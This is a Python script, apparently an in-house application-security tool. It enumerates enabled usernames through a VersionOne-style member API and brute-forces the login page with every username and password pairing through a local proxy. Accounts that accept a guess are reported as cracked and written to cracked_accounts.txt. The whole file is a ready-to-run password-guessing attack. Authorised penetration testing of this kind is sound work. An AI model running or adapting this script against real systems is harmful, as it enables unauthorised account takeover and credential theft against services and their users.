#!/usr/bin/python3
import sys
import requests

from v1_password_fuzzer import construct_unames, construct_passwords

def record_credentials(creds):
    file = open("cracked_accounts.txt", "a")
    file.writelines(creds + "\n")
    file.close()

default_url = "http://gjohnson3/bcrypt/"
default_proxy = "http://localhost:8080/"
login_route = "Account.mvc/Login/"
member_api_url = default_url + "rest-1.v1/Data/Member?sel=Username&where=IsLoginDisabled='False'"

unames = construct_unames(member_api_url, default_proxy)
print("constructed {0} usernames...".format(len(unames)))

passwords = construct_passwords()
total_requests = len(unames) * len(passwords)
print("constructed {0} passwords...".format(len(passwords)))
prompt = "As a result, {0} web requests will be generated.  Do you want to continue?  (Y/n)  ".format(total_requests)
result = input(prompt)
if not result == "Y":
    print('quitter!')
    sys.exit(0)

r = requests.get(default_url)

if not r.status_code == 200:
    print("Exiting:  invalid url {0}".format(default_url))
    sys.exit(1)

cracked_accounts = []

cnt = 0
session = requests.session()
for uname in unames:
    for pw in passwords:
        r = session.post(default_url + login_route, \
            data = {'username': uname, 'password': pw, 'Destination': ''}, \
            headers = {'user-agent': 'V1AppSec-PasswordFuzzer'}, \
            proxies = default_proxy)
        cnt = cnt + 1
        update = "working...{0} of {1} requests made\r".format(cnt, total_requests)
        print(update, end="", flush=True)
        if len(r.history) == 0:
            continue
        creds = "{0}:{1}".format(uname, pw)
        print("Cracked creds: {0}".format(creds + " " * 100))
        cracked_accounts.append(creds)
        record_credentials(creds)
        session.cookies.clear()

print("\n")

print("{0} accounts compromised".format(len(cracked_accounts)))

print("{0} requests completed".format(total_requests))